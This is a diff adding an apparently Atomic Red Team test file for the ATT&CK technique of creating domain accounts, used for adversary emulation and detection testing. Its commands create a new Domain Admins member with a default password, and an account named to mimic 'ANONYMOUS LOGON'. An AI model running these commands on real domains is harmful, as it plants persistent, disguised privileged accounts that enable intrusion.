@@ -1,0 +1,52 @@
+attack_technique: T1136.002
+display_name: 'Create Account: Domain Account'
+atomic_tests:
+- name: Create a new Windows domain admin user
+  auto_generated_guid: fcec2963-9951-4173-9bfa-98d8b7834e62
+  description: |
+    Creates a new domain admin user in a command prompt.
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: String
+      default: T1136.002_Admin
+    password:
+      description: Password of the user to create
+      type: String
+      default: T1136_pass123!
+    group:
+      description: Domain administrator group to which add the user to
+      type: String
+      default: Domain Admins
+  executor:
+    command: |
+      net user "#{username}" "#{password}" /add /domain
+      net group "#{group}" "#{username}" /add /domain
+    cleanup_command: |
+      net user "#{username}" >nul 2>&1 /del /domain
+    name: command_prompt
+    elevation_required: false  # Requires a user to be a Domain Admin!
+- name: Create a new account similar to ANONYMOUS LOGON
+  auto_generated_guid: dc7726d2-8ccb-4cc6-af22-0d5afb53a548
+  description: |
+    Create a new account similar to ANONYMOUS LOGON in a command prompt.
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: String
+      default: ANONYMOUS  LOGON
+    password:
+      description: Password of the user to create
+      type: String
+      default: T1136_pass123!
+  executor:
+    command: |
+      net user "#{username}" "#{password}" /add /domain
+    cleanup_command: |
+      net user "#{username}" >nul 2>&1 /del /domain
+    name: command_prompt
+    elevation_required: false  # Requires a user to be a Domain Admin!
